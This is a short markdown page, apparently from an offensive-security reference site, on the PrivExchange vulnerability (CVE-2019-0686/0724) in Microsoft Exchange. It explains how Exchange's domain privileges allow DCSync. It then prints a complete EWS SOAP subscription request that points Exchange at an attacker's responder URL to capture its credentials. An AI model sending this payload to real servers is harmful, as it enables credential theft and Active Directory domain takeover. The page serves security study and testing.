docs/cves/CVE-2019-0686.md

icon:fontawesome/solid/unlock-keyhole

# CVE-2019-0686

PrivExchange - Abusing Exchange: One API call away from Domain Admin (CVE-2019-0686 & CVE-2019-0724)

- [Abusing Exchange - One API call away from Domain Admin Exploiting PrivExchange](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)

The main vulnerability here is that Exchange has high privileges in the Active Directory domain. The Exchange Windows Permissions group has WriteDacl access on the Domain object in Active Directory, which enables any member of this group to modify the domain privileges, among which is the privilege to perform DCSync operations. Users or computers with this privilege can perform synchronization operations that are normally used by Domain Controllers to replicate, which allows attackers to synchronize all the hashed passwords of users in the Active Directory.

## Examples

##### SOAP Request creating subscription to mailbox

```bash
POST /ews HTTP/1.1
Host: exchange.example.com
Accept: */*
Accept-Language: nl-nl
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=UTF-8
Content-Length: 934
Connection: close
Referer: https://exchange.example.com/ews
User-Agent: iPhone/11.1

<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
    <soap:Header>
        <t:RequestServerVersion Version="Exchange2013" />
    </soap:Header>
    <soap:Body>
        <m:Subscribe>
            <m:PushSubscriptionRequest SubscribeToAllFolders="true">
                <t:EventTypes>
                    <t:EventType>NewMailEvent</t:EventType>
                    <t:EventType>ModifiedEvent</t:EventType>
                    <t:EventType>MovedEvent</t:EventType>
                </t:EventTypes>
                <t:StatusFrequency>1</t:StatusFrequency>
                <t:URL>http://<responder-IP-adres/gibcredsplz_2013_4/</t:URL>
            </m:PushSubscriptionRequest>
        </m:Subscribe>
    </soap:Body>
</soap:Envelope>
```

## References

- [Github.com - DirkjanM - PrivExchange](https://github.com/dirkjanm/PrivExchange)
- [Abusing Exchange - One API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
- [Chryzsh.github.io - Exploiting PrivExchange](https://chryzsh.github.io/exploiting-privexchange/)
